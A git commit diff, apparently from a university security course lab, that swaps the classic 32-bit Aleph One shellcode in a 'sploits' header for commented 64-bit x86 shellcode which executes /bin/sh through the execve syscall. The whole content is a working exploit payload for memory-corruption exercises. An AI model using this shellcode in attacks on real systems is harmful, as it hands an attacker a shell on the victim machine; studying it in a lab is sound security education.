5409d7c69f0ac3f26d91a403376ba1de677bea50
Benjamin Cheng <ben@bcheng.me>
2022-09-19 15:55:14 -0400

    lab1: initial shellcode

--- lab1/sploits/shellcode-64.h
+++ lab1/sploits/shellcode-64.h
@@ -1,7 +1,18 @@
-/*
- *  * Aleph One shellcode.
- *   */
 static char shellcode[] =
-  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+    "\x48\x31\xc0"                  /* xor rax, rax */
+    "\x50"                          /* push rax */
+    "\x48\x8d\x3d\x22\x01\x01\x01"  /* lea rdi,[rip + 0x101010122] */
+    "\x48\x81\xef\x01\x01\x01\x01"  /* sub rdi,0x10101010 */
+    "\x57"                          /* push rdi */
+    "\x48\x89\xe6"                  /* mov rsi, rsp */
+    "\x48\x31\xd2"                  /* xor rdx, rdx */
+
+    "\x48\x89\xf8"                  /* mov rax, rdi */
+    "\x48\x83\xc0\x07"              /* add rax, 0x7 */
+    "\x48\x31\xdb"                  /* xor rbx, rbx */
+    "\x88\x18"                      /* mov [rax], bl */
+
+    "\x48\x31\xc0"                  /* xor rax, rax */
+    "\xb0\x3b"                      /* mov al, 0x3b */
+    "\x0f\x05"                      /* syscall */
+    "/bin/sh";
